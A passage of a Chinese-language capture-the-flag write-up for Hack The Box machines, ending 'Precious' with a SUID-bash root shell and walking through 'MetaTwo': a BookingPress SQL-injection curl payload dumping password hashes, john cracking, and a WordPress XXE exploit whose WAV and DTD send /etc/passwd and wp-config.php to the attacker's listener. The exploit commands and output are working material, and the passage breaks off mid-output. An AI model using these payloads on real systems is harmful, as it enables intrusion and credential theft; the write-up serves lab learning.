+        10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements&#39;
+         9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each&#39;
+         8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from&#39;
+         7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read&#39;
+         6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG&#39;
+         5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;&#39;
+         4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&#39;
+         3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve&#39;
+         2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;&#39;
+         1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write&#39;
+/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system&#39;: no implicit conversion of nil into String (TypeError)
+henry@precious:~$ ls -al
+total 32
+drwxr-xr-x 3 henry henry 4096 Feb 11 07:47 .
+drwxr-xr-x 4 root  root  4096 Oct 26 08:28 ..
+lrwxrwxrwx 1 root  root     9 Sep 26 05:04 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 henry henry  220 Sep 26 04:40 .bash_logout
+-rw-r--r-- 1 henry henry 3526 Sep 26 04:40 .bashrc
+-rw-r--r-- 1 henry henry  619 Feb 11 07:47 dependencies.yml
+drwxr-xr-x 3 henry henry 4096 Feb 11 06:30 .local
+-rw-r--r-- 1 henry henry  807 Sep 26 04:40 .profile
+-rw-r----- 1 root  henry   33 Feb 11 05:10 user.txt
+henry@precious:~$ ls -al /bin/bash
+-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
+henry@precious:~$ /bin/bash -p
+bash-5.1# whoami
+root
+bash-5.1# cd /root
+bash-5.1# ls
+root.txt
+bash-5.1# cat root.txt
+20365dcbcc3d536222b0cbcdb5972c5a
+</code></pre>
+<p>拿到root flag</p>
+<h2 id="MetaTwo"><a href="#MetaTwo" class="headerlink" title="MetaTwo"></a>MetaTwo</h2><h3 id="nmap扫描-2"><a href="#nmap扫描-2" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><pre><code class="shell">┌──(root💀kali)-[~]
+└─# nmap -sC -sV 10.10.11.186
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-02-11 05:08 EST
+Stats: 0:00:47 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 98.30% done; ETC: 05:09 (0:00:00 remaining)
+Nmap scan report for metapress.htb (10.10.11.186)
+Host is up (1.5s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 ProFTPD Server (Debian) [::ffff:10.10.11.186]
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 c4:b4:46:17:d2:10:2d:8f:ec:1d:c9:27:fe:cd:79:ee (RSA)
+|   256 2a:ea:2f:cb:23:e8:c5:29:40:9c:ab:86:6d:cd:44:11 (ECDSA)
+|_  256 fd:78:c0:b0:e2:20:16:fa:05:0d:eb:d8:3f:12:a4:ab (ED25519)
+80/tcp open  http    nginx 1.18.0
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-generator: WordPress 5.6.2
+| http-robots.txt: 1 disallowed entry 
+|_/wp-admin/
+|_http-server-header: nginx/1.18.0
+|_http-title: MetaPress &amp;#8211; Official company site
+|_http-trane-info: Problem with XML parsing of /evox/about
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V=7.91%I=7%D=2/11%Time=63E76940%P=x86_64-pc-linux-gnu%r(Gene
+SF:ricLines,8F,&quot;220\x20ProFTPD\x20Server\x20\(Debian\)\x20\[::ffff:10\.10\
+SF:.11\.186\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20cre
+SF:ative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creative
+SF:\r\n&quot;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 95.15 second
+</code></pre>
+<p>开放了80&#x2F;22&#x2F;21端口</p>
+<p>在&#x2F;etc&#x2F;hosts中添加<strong>metapress.htb</strong></p>
+<h3 id="web漏洞发现-1"><a href="#web漏洞发现-1" class="headerlink" title="web漏洞发现"></a>web漏洞发现</h3><p>查看网页，通过wappalyzer看到使用了WordPress5.6.2搭建</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.vpesytp0ag0.webp" alt="image"></p>
+<p>此时，我们可以使用wpscan来扫描可能存在的漏洞，可能由于我的wpscan版本过低并没有扫出来</p>
+<p>手工查找漏洞，F12查看，用到了一个名为bookingpress的插件，版本为1.0.10</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.5n7znnthnws0.webp" alt="image"></p>
+<h3 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h3><p>Google一下，存在一个SQL注入漏洞</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357" >https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357<i class="fas fa-external-link-alt"></i></a></p>
+<p>根据链接，我们需要得到**_wpnonce**的值，F12查找</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.7b2hbu4j5ok0.webp" alt="image"></p>
+<p>得到值为<code>b67ccae67b</code></p>
+<pre><code class="shell">┌──(root💀kali)-[~]
+└─# curl -i &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; --data &#39;action=bookingpress_front_get_category_services&amp;_wpnonce=b67ccae67b&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -&#39;
+HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Sat, 11 Feb 2023 10:21:47 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/8.0.24
+X-Robots-Tag: noindex
+X-Content-Type-Options: nosniff
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+X-Frame-Options: SAMEORIGIN
+Referrer-Policy: strict-origin-when-cross-origin
+
+[&#123;&quot;bookingpress_service_id&quot;:&quot;10.5.15-MariaDB-0+deb11u1&quot;,&quot;bookingpress_category_id&quot;:&quot;Debian 11&quot;,&quot;bookingpress_service_name&quot;:&quot;debian-linux-gnu&quot;,&quot;bookingpress_service_price&quot;:&quot;$1.00&quot;,&quot;bookingpress_service_duration_val&quot;:&quot;2&quot;,&quot;bookingpress_service_duration_unit&quot;:&quot;3&quot;,&quot;bookingpress_service_description&quot;:&quot;4&quot;,&quot;bookingpress_service_position&quot;:&quot;5&quot;,&quot;bookingpress_servicedate_created&quot;:&quot;6&quot;,&quot;service_price_without_currency&quot;:1,&quot;img_url&quot;:&quot;http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg&quot;&#125;]    
+</code></pre>
+<pre><code class="shell">┌──(root💀kali)-[~]
+└─# curl -i &#39;http://metapress.htb/wp-admin/admin-ajax.php&#39; --data &#39;action=bookingpress_front_get_category_services&amp;_wpnonce=b67ccae67b&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT group_concat(user_login),group_concat(user_pass),@@version_compile_os,1,2,3,4,5,6 from wp_users-- -&#39;
+HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Sat, 11 Feb 2023 10:22:50 GMT
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: keep-alive
+X-Powered-By: PHP/8.0.24
+X-Robots-Tag: noindex
+X-Content-Type-Options: nosniff
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+X-Frame-Options: SAMEORIGIN
+Referrer-Policy: strict-origin-when-cross-origin
+
+[&#123;&quot;bookingpress_service_id&quot;:&quot;admin,manager&quot;,&quot;bookingpress_category_id&quot;:&quot;$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.,$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70&quot;,&quot;bookingpress_service_name&quot;:&quot;debian-linux-gnu&quot;,&quot;bookingpress_service_price&quot;:&quot;$1.00&quot;,&quot;bookingpress_service_duration_val&quot;:&quot;2&quot;,&quot;bookingpress_service_duration_unit&quot;:&quot;3&quot;,&quot;bookingpress_service_description&quot;:&quot;4&quot;,&quot;bookingpress_service_position&quot;:&quot;5&quot;,&quot;bookingpress_servicedate_created&quot;:&quot;6&quot;,&quot;service_price_without_currency&quot;:1,&quot;img_url&quot;:&quot;http:\/\/metapress.htb\/wp-content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg&quot;&#125;]content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-img.jpg&quot;&#125;] 
+</code></pre>
+<p>得到<code>admin,manager：$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.,$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70</code></p>
+<h3 id="john爆破"><a href="#john爆破" class="headerlink" title="john爆破"></a>john爆破</h3><pre><code>┌──(root💀kali)-[~]
+└─# cat metapress                                                                                                                                                                                        130 ⨯
+admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
+manager:$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
+                   
+┌──(root💀kali)-[~]
+└─# john -w=/usr/share/wordlists/rockyou.txt metapress 
+Using default input encoding: UTF-8
+Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
+Remaining 1 password hash
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 8 OpenMP threads
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:05 0.41% (ETA: 05:44:45) 0g/s 13894p/s 13894c/s 13894C/s steve11..nick20
+0g 0:00:01:14 6.41% (ETA: 05:43:33) 0g/s 14077p/s 14077c/s 14077C/s SHAZZA..SASHA11
+0g 0:00:01:18 6.80% (ETA: 05:43:25) 0g/s 14095p/s 14095c/s 14095C/s 17070..16571657
+Session aborted
+                                                                                                                                                                                                               
+┌──(root💀kali)-[~]
+└─# john --show metapress                                                                                                                                                                                  1 ⨯
+manager:partylikearockstar
+
+1 password hash cracked, 1 left
+</code></pre>
+<p>用得到的用户名密码登录网站后台</p>
+<p>发现除了能上传media，就没什么能做的了</p>
+<p><img src="https://cdn.staticaly.com/gh/n3ym4r/image@master/24/image.7730p0j3tag0.webp" alt="image"></p>
+<p>之前我们得到WordPress版本为5.6.2，Google一下</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/motikan2010/CVE-2021-29447" >https://github.com/motikan2010/CVE-2021-29447<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://tryhackme.com/room/wordpresscve202129447" >https://tryhackme.com/room/wordpresscve202129447<i class="fas fa-external-link-alt"></i></a></p>
+<p>存在XXE漏洞</p>
+<h3 id="XXE漏洞-CVE-2021-29447"><a href="#XXE漏洞-CVE-2021-29447" class="headerlink" title="XXE漏洞-CVE-2021-29447"></a>XXE漏洞-CVE-2021-29447</h3><p>我们需要创建一个 <code>WAV</code> 文件，该文件将获取另一个名为 <code>dedsec.dtd</code> 的文件，其中包含我们的恶意内容</p>
+<pre><code class="shell">┌──(root💀kali)-[~]
+└─# echo -en &#39;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http://10.10.16.8:9999/dedsec.dtd&#39;&quot;&#39;&quot;&#39;&gt;%remote;%init;%trick;]&gt;\x00&#39; &gt; payload.wav         
+</code></pre>
+<p>创建 <code>dedsec.dtd</code> 文件，它将读取 <code>/etc/passwd</code> 文件并将其转换为 <code>base64</code> 并在我们的 <code>php</code> 服务器上发送 <code>GET</code> 请求中的数据</p>
+<pre><code class="shell">┌──(root💀kali)-[~]
+└─# cat dedsec.dtd                                                                                                                                                                                          
+&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;
+&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#39;http://10.10.16.8:9999/?p=%file;&#39;&gt;&quot; &gt;
+</code></pre>
+<p>启动 <code>PHP</code> 服务器</p>
+<pre><code class="shell">┌──(root💀kali)-[~]
+└─# php -S 0.0.0.0:9999
+[Sat Feb 11 04:05:17 2023] PHP 7.4.21 Development Server (http://0.0.0.0:9999) started
+</code></pre>
+<p>在网页端上传payload.wav,收到回显</p>
+<pre><code class="shell">┌──(root💀kali)-[~]
+└─# php -S 0.0.0.0:9999
+[Sat Feb 11 04:05:17 2023] PHP 7.4.21 Development Server (http://0.0.0.0:9999) started
+[Sat Feb 11 04:05:59 2023] 10.10.11.186:60700 Accepted
+[Sat Feb 11 04:05:59 2023] 10.10.11.186:60700 [200]: (null) /dedsec.dtd
+[Sat Feb 11 04:05:59 2023] 10.10.11.186:60700 Closing
+[Sat Feb 11 04:06:00 2023] 10.10.11.186:39782 Accepted
+[Sat Feb 11 04:06:01 2023] 10.10.11.186:39782 [200]: GET 0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=                                      
+[Sat Feb 11 04:06:01 2023] 10.10.11.186:39782 Closing
+[Sat Feb 11 04:06:03 2023] 10.10.11.186:39792 Accepted
+[Sat Feb 11 04:06:03 2023] 10.10.11.186:39792 [200]: GET /dedsec.dtd
+[Sat Feb 11 04:06:03 2023] 10.10.11.186:39792 Closing
+[Sat Feb 11 04:06:04 2023] 10.10.11.186:39800 Accepted
+[Sat Feb 11 04:06:05 2023] 10.10.11.186:39800 [200]: GET /?p=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=
+</code></pre>
+<p>base64解码</p>
+<pre><code class="shell">┌──(root💀kali)-[~]
+└─# echo &quot;cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=&quot; |base64 -d
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
+sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
+jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
+systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
+systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
+mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
+proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
+ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
+</code></pre>
+<p>得到&#x2F;etc&#x2F;passwd内容</p>
+<p>WordPress的配置文件为wp-config.php,接下来尝试读取</p>
+<p>将<code>dedsec.dtd</code>更改</p>
+<pre><code class="shell">┌──(root💀kali)-[~]
+└─# cat dedsec.dtd 
+&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php&quot;&gt;
+&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#39;http://10.10.16.8:9999/?p=%file;&#39;&gt;&quot; &gt;
+</code></pre>
+<p>上传payload.waf,回显</p>
+<pre><code class="shell">[Sat Feb 11 04:31:10 2023] 10.10.11.186:60128 Closing
+[Sat Feb 11 04:31:12 2023] 10.10.11.186:53418 Accepted
+[Sat Feb 11 04:31:13 2023] 10.10.11.186:53418 [200]: GET /dedsec.dtd
+[Sat Feb 11 04:31:13 2023] 10.10.11.186:53418 Closing
+[Sat Feb 11 04:31:15 2023] 10.10.11.186:53422 Accepted
+[Sat Feb 11 04:31:15 2023] 10.10.11.186:53422 [200]: GET /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0U